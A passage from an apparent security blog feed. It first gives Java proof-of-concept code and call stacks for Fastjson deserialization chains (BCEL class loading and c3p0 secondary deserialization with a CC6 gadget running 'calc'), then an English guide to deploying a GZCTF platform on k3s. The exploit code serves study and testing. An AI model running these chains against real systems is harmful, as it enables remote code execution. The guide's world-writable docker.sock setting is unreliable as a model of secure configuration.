(java.lang)</span><br><span class="line">loadClass:163, ClassLoader (com.sun.org.apache.bcel.internal.util)</span><br><span class="line">loadClass:357, ClassLoader (java.lang)</span><br><span class="line">forName0:-1, Class (java.lang)</span><br><span class="line">forName:348, Class (java.lang)</span><br><span class="line">createConnectionFactory:2156, BasicDataSource (org.apache.tomcat.dbcp.dbcp2)</span><br><span class="line">createDataSource:2061, BasicDataSource (org.apache.tomcat.dbcp.dbcp2)</span><br><span class="line">getConnection:1543, BasicDataSource (org.apache.tomcat.dbcp.dbcp2)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:498, Method (java.lang.reflect)</span><br><span class="line">get:451, FieldInfo (com.alibaba.fastjson.util)</span><br><span class="line">getPropertyValue:114, FieldSerializer (com.alibaba.fastjson.serializer)</span><br><span class="line">getFieldValuesMap:439, JavaBeanSerializer (com.alibaba.fastjson.serializer)</span><br><span class="line">toJSON:902, JSON (com.alibaba.fastjson)</span><br><span class="line">toJSON:824, JSON (com.alibaba.fastjson)</span><br><span class="line">parseObject:206, JSON (com.alibaba.fastjson)</span><br><span class="line">main:27, POC_1_2_24 (Poc.bcel)</span><br></pre></td></tr></table></figure><p>bcel exp for fastjson &lt;&#x3D; 1.2.47</p><figure class="highlight java"><figcaption><span>title:"poc.java"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Poc.bcel;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@program</span>: Fastjson</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span>: bcel for fastjson &lt;= 1.2.47</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>: Jasper_sec</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span>: 2025-03-15 15:42</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">POC_1_2_47</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// jdk &lt; 8u251</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">evilClass</span> <span class="operator">=</span> <span class="string">&quot;D:\\Security\\JavaSec\\EvilClass\\Evil.class&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">code</span> <span class="operator">=</span> file2bcelcode(evilClass);</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;xx\&quot;:\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;@type\&quot; : \&quot;java.lang.Class\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;val\&quot;   : \&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &#125;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    \&quot;x\&quot; : &#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;name\&quot;: &#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            \&quot;@type\&quot; : \&quot;java.lang.Class\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            \&quot;val\&quot;   : \&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &#125;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            \&quot;@type\&quot;:\&quot;com.alibaba.fastjson.JSONObject\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            \&quot;c\&quot;: &#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                \&quot;@type\&quot;:\&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                \&quot;driverClassLoader\&quot;: &#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                    \&quot;@type\&quot; : \&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                &#125;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;                \&quot;driverClassName\&quot;:\&quot;$$BCEL$$&quot;</span>+code+<span class="string">&quot;\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;            &#125;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &#125; : \&quot;xxx\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &#125;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> JSON.parseObject(payload);</span><br><span class="line">        <span class="comment">// 这里必不可少，坑</span></span><br><span class="line">        jsonObject.toJSONString();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">file2bcelcode</span><span class="params">(String classFilePath)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytecode = Files.readAllBytes(Paths.get(classFilePath));</span><br><span class="line">        <span class="keyword">return</span> Utility.encode(bytecode, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个版本踩坑，触发点不在 parseObject，而是得到反序列化后的对象， 再进行 <code>jsonObject.toJSONString()</code> 才会触发。</p><p>这个链子和上一个完全一样，不再赘述。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">defineClass:642, ClassLoader (java.lang)</span><br><span class="line">loadClass:163, ClassLoader (com.sun.org.apache.bcel.internal.util)</span><br><span class="line">loadClass:357, ClassLoader (java.lang)</span><br><span class="line">forName0:-1, Class (java.lang)</span><br><span class="line">forName:348, Class (java.lang)</span><br><span class="line">createConnectionFactory:2156, BasicDataSource (org.apache.tomcat.dbcp.dbcp2)</span><br><span class="line">createDataSource:2061, BasicDataSource (org.apache.tomcat.dbcp.dbcp2)</span><br><span class="line">getConnection:1543, BasicDataSource (org.apache.tomcat.dbcp.dbcp2)</span><br><span class="line">write:-1, ASMSerializer_1_BasicDataSource (com.alibaba.fastjson.serializer)</span><br><span class="line">write:270, MapSerializer (com.alibaba.fastjson.serializer)</span><br><span class="line">write:44, MapSerializer (com.alibaba.fastjson.serializer)</span><br><span class="line">write:281, JSONSerializer (com.alibaba.fastjson.serializer)</span><br><span class="line">write:236, MapSerializer (com.alibaba.fastjson.serializer)</span><br><span class="line">write:44, MapSerializer (com.alibaba.fastjson.serializer)</span><br><span class="line">write:270, MapSerializer (com.alibaba.fastjson.serializer)</span><br><span class="line">write:44, MapSerializer (com.alibaba.fastjson.serializer)</span><br><span class="line">write:281, JSONSerializer (com.alibaba.fastjson.serializer)</span><br><span class="line">toJSONString:863, JSON (com.alibaba.fastjson)</span><br><span class="line">main:46, POC_1_2_47 (Poc.bcel)</span><br></pre></td></tr></table></figure><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://www.freebuf.com/vuls/360993.html">https://www.freebuf.com/vuls/360993.html</a></li></ul><h2 id="c3p0二次反序列化链"><a href="#c3p0二次反序列化链" class="headerlink" title="c3p0二次反序列化链"></a>c3p0二次反序列化链</h2><h3 id="影响范围-2"><a href="#影响范围-2" class="headerlink" title="影响范围"></a>影响范围</h3><p>fastjson &lt; 1.2.47 ，payload 分两个，简单的可在低版本使用，复杂的可在 fastjson &lt;1.2.47 的条件下使用。</p><h3 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>漏洞本质：通过fastjson触发setter设置<code>userOverridesAsString</code>，source点是WrapperConnectionPoolDataSource的构造函数，其中会执行<code>parseUserOverridesAsString(this.getUserOverridesAsString())</code>，经过一系列调用会到达 sink 点，一个反序列化方法<code>com.mchange.v2.ser.SerializableUtils#deserializeFromByteArray</code>，他会对<code>userOverridesAsString</code>中的 bytecodes 做解码和反序列化。</p><p>所以我们的 payload 应该是一个 evil object 的序列化字符串，并对其进行相应的编码，在fastjson链子触发之后，会对这个evil serialize string 进行解码和反序列化，从而实现二次反序列化攻击，。下面的Poc使用的是 CC6的对象。</p><p>需要注意的是 <code>WrapperConnectionPoolDataSource</code> 本身并没有 <code>userOverridesAsString</code> 属性和其对应的 setter，但是它的父类 <code>WrapperConnectionPoolDataSourceBase</code> 有，所以链子才能够走通。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/9f3bffd838a5bee5c5af218e8822cc69.png"></p><figure class="highlight java"><figcaption><span>title:"POC_1_2_47.java"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@program</span>: Fastjson</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span>: c3p0 chain for fastjson &lt; 1.2.47</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>: Jasper_sec</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span>: 2025-04-01 03:58</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">POC_1_2_47</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">hex</span> <span class="operator">=</span> toHexAscii(tobyteArray(exp()));</span><br><span class="line">        System.out.println(hex);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//Fastjson&lt;1.2.47</span></span><br><span class="line"><span class="comment">//        String payload = &quot;&#123;&quot; +</span></span><br><span class="line"><span class="comment">//                &quot;\&quot;1\&quot;:&#123;&quot; +</span></span><br><span class="line"><span class="comment">//                &quot;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,&quot; +</span></span><br><span class="line"><span class="comment">//                &quot;\&quot;val\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;&quot; +</span></span><br><span class="line"><span class="comment">//                &quot;&#125;,&quot; +</span></span><br><span class="line"><span class="comment">//                &quot;\&quot;2\&quot;:&#123;&quot; +</span></span><br><span class="line"><span class="comment">//                &quot;\&quot;@type\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;,&quot; +</span></span><br><span class="line"><span class="comment">//                &quot;\&quot;userOverridesAsString\&quot;:\&quot;HexAsciiSerializedMap:&quot;+ hex + &quot;;\&quot;,&quot; +</span></span><br><span class="line"><span class="comment">//                &quot;&#125;&quot; +</span></span><br><span class="line"><span class="comment">//                &quot;&#125;&quot;;</span></span><br><span class="line">        <span class="comment">//低版本利用</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;@type\&quot;:\&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource\&quot;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;userOverridesAsString\&quot;:\&quot;HexAsciiSerializedMap:&quot;</span> + hex + <span class="string">&quot;;\&quot;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 构造 CC6 evil object</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">exp</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>)),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap1 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">LazyMap</span> <span class="variable">lazyMap</span> <span class="operator">=</span> (LazyMap) LazyMap.decorate(hashMap1, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;Atkx&quot;</span>);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap2 = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap2.put(tiedMapEntry, <span class="string">&quot;bbb&quot;</span>);</span><br><span class="line">        lazyMap.remove(<span class="string">&quot;Atkx&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> LazyMap.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factoryField</span> <span class="operator">=</span> clazz.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factoryField.set(lazyMap, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> hashMap2;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>函数调用栈，这里只给触发二次反序列化的第一次，后面的CC6就不放了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">deserializeFromByteArray:143, SerializableUtils (com.mchange.v2.ser)</span><br><span class="line">fromByteArray:123, SerializableUtils (com.mchange.v2.ser)</span><br><span class="line">parseUserOverridesAsString:318, C3P0ImplUtils (com.mchange.v2.c3p0.impl)</span><br><span class="line">vetoableChange:110, WrapperConnectionPoolDataSource$1 (com.mchange.v2.c3p0)</span><br><span class="line">fireVetoableChange:375, VetoableChangeSupport (java.beans)</span><br><span class="line">fireVetoableChange:271, VetoableChangeSupport (java.beans)</span><br><span class="line">setUserOverridesAsString:387, WrapperConnectionPoolDataSourceBase (com.mchange.v2.c3p0.impl)</span><br><span class="line">invoke0:-1, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:62, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:43, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:498, Method (java.lang.reflect)</span><br><span class="line">setValue:96, FieldDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:593, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:188, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">deserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)</span><br><span class="line">parseObject:368, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parse:1293, DefaultJSONParser (com.alibaba.fastjson.parser)</span><br><span class="line">parse:137, JSON (com.alibaba.fastjson)</span><br><span class="line">parse:128, JSON (com.alibaba.fastjson)</span><br><span class="line">main:46, POC_1_2_47 (Poc.c3p0)</span><br></pre></td></tr></table></figure><h3 id="参考链接-1"><a href="#参考链接-1" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://tttang.com/archive/1886/">https://tttang.com/archive/1886/</a></li><li><a href="https://blog.csdn.net/uuzeray/article/details/136563391">https://blog.csdn.net/uuzeray/article/details/136563391</a></li></ul><h2 id="Commons-io-写⽂件-webshell-TODO"><a href="#Commons-io-写⽂件-webshell-TODO" class="headerlink" title="Commons-io 写⽂件&#x2F;webshell TODO"></a>Commons-io 写⽂件&#x2F;webshell TODO</h2><p>以后再来</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;TemplatesImpl-链&quot;&gt;&lt;a href=&quot;#TemplatesImpl-链&quot; class=&quot;headerlink&quot; title=&quot;TemplatesImpl 链&quot;&gt;&lt;/a&gt;TemplatesImpl 链&lt;/h2&gt;&lt;h3 id=&quot;影响范围&quot;&gt;&lt;a href</summary>
      
    
    
    
    
    <category term="Java" scheme="https://jaspersec.top/tags/Java/"/>
    
    <category term="反序列化" scheme="https://jaspersec.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    <category term="Fastjson" scheme="https://jaspersec.top/tags/Fastjson/"/>
    
  </entry>
  
  <entry>
    <title>GZCTF Platform Deployment with k3s</title>
    <link href="https://jaspersec.top/posts/334536658.html"/>
    <id>https://jaspersec.top/posts/334536658.html</id>
    <published>2025-01-01T16:41:02.000Z</published>
    <updated>2025-04-02T12:07:54.940Z</updated>
    
    <content type="html"><![CDATA[<p> <a href="https://xmcve.com/">星盟安全团队</a>长期招新中~ 我们的目标是星辰大海！ </p><ul><li>简历格式：ID、联系方式、掌握技术、比赛情况</li><li>简历投递邮箱： <a href="mailto:&#x78;&#109;&#99;&#118;&#x65;&#x40;&#x71;&#113;&#x2e;&#x63;&#x6f;&#x6d;">&#x78;&#109;&#99;&#118;&#x65;&#x40;&#x71;&#113;&#x2e;&#x63;&#x6f;&#x6d;</a></li><li>联系QQ：1609410364</li></ul><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>GZ::CTF official guide document strongly recommended us to build GZCTF with <code>docker + k3s</code> solution , which can substains small &#x2F; middle  competition for public.</p><p>It means we need two servers at least,  <code>Docker</code> one  used to build gzctf frontend and <code>k3s</code> one for the containers backend.</p><h2 id="Local-Deployment"><a href="#Local-Deployment" class="headerlink" title="Local Deployment"></a>Local Deployment</h2><p>Asset Topology：</p><ul><li>192.168.1.100 : Used for GZCTF platform deployment (frontend)，OS: ubuntu 20.04</li><li>192.168.1.195 : Used for  k3s container cluster deployment (backend) ，OS ubuntu 20.04</li></ul><h3 id="k3s-Deployment"><a href="#k3s-Deployment" class="headerlink" title="k3s Deployment"></a>k3s Deployment</h3><p><strong><code>k3s</code> installation：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">## Domestic</span><br><span class="line">curl -sfL https://rancher-mirror.rancher.cn/k3s/k3s-install.sh | INSTALL_K3S_MIRROR=cn sh -</span><br><span class="line">## Foreign</span><br><span class="line">curl -sfL https://get.k3s.io | sh -</span><br><span class="line">## check the installation</span><br><span class="line">k3s -v</span><br></pre></td></tr></table></figure><p>NOTICE: Original config of k3s can’t pull docker images for some reasons. So we need to set  third-party image proxy.</p><p>Just add onfigration to <code>/etc/rancher/k3s/registries.yaml</code> like below:</p><figure class="highlight yaml"><figcaption><span>title:"/etc/rancher/k3s/registries.yaml"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">mirrors:</span></span><br><span class="line">  <span class="attr">&quot;docker.io&quot;:</span></span><br><span class="line">    <span class="attr">endpoint:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;https://hub.littlediary.cn&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;https://hub.xdark.top&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;https://cjie.eu.org&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;https://docker.1panel.live&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;https://docker.unsee.tech&quot;</span></span><br></pre></td></tr></table></figure><p><strong><code>Kuboard</code> installation</strong> , a WebUI of <code>k3s</code> for convenience of control k3s.  Kuboard depends on <code>dcoker</code>, so we install <code>docker</code> and <code>docker-compose</code> first.</p><p>Install <code>docker</code> and <code>docker-compose</code> command：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">## Install docker-compose</span><br><span class="line">sudo curl -L https://github.com/docker/compose/releases/download/v2.32.1/docker-compose-`uname -s`-`uname -m` -o /usr/local/bin/docker-compose</span><br><span class="line">sudo chmod +x /usr/local/bin/docker-compose</span><br><span class="line"></span><br><span class="line">## Install docker</span><br><span class="line">sudo apt install docker.io</span><br><span class="line"></span><br><span class="line">## Optional,  make docker/docker-compose command don&#x27;t need type &quot;sudo&quot; front of them anymore. </span><br><span class="line">## It&#x27;s troublesome to always input the password :x</span><br><span class="line">sudo groupadd docker</span><br><span class="line">sudo gpasswd -a $&#123;USER&#125; docker</span><br><span class="line">sudo systemctl restart docker</span><br><span class="line">sudo chmod a+rw /var/run/docker.sock</span><br></pre></td></tr></table></figure><p>next, install <code>Kuboard</code>. Actually, Code block below just pull a docker image and  run a web container.  </p><p>Just try <code>chmod +x run_kuboard.sh &amp;&amp; ./run_kuboard.sh</code> command to  run the below shell script.</p><p>NOTICE: <code>KUBOARD_BASE_URL</code>  need to change to your own k3s vps, for me it’s <code>http://192.168.0.195</code></p><figure class="highlight shell"><figcaption><span>title:"run_kuboard.sh"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="comment"># Run the Docker container</span></span></span><br><span class="line">docker run -d \</span><br><span class="line">  --restart=unless-stopped \</span><br><span class="line">  --name=kuboard \</span><br><span class="line">  -p 3271:80/tcp \</span><br><span class="line">  -p 10081:10081/tcp \</span><br><span class="line">  -e KUBOARD_ENDPOINT=&quot;http://192.168.0.195:3271&quot; \</span><br><span class="line">  -e KUBOARD_AGENT_SERVER_TCP_PORT=&quot;10081&quot; \</span><br><span class="line">  -v /root/kuboard-data:/data \</span><br><span class="line">  swr.cn-east-2.myhuaweicloud.com/kuboard/kuboard:v3</span><br></pre></td></tr></table></figure><p>After that, just visit <code>http://192.168.1.195:3271</code> to see the kuboard panel. Default account is : <code>admin/Kuboard123</code><br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/3db4357cc5185f9a28c8e1ac36a2df15.png"></p><p>Now we got <code>k3s</code> and <code>kuboard</code>, but <code>k3s</code> has not been bound to <code>kuboard</code> yet. We need to add k3s cluster to kuboard.<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/be7e875340711f18e5c312ce0118ff97.png"></p><p>There are two inputs that we need to pay attention to,  <code>kubeconfig</code> and <code>ApiServer地址</code>. <code>名称</code> and <code>描述</code> just take a name and description you want  And the <code>Context</code> position just have one chioce which is <code>default</code> after we set  <code>kubeconfig</code><br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/3c62c14f28c66098dddd2916a9becc9a.png"></p><p>For the  <code>kubeconfig</code> position, We need to <strong>completely</strong> copy the content of file in <code>/etc/rancher/k3s/k3s.yaml</code>.</p><figure class="highlight 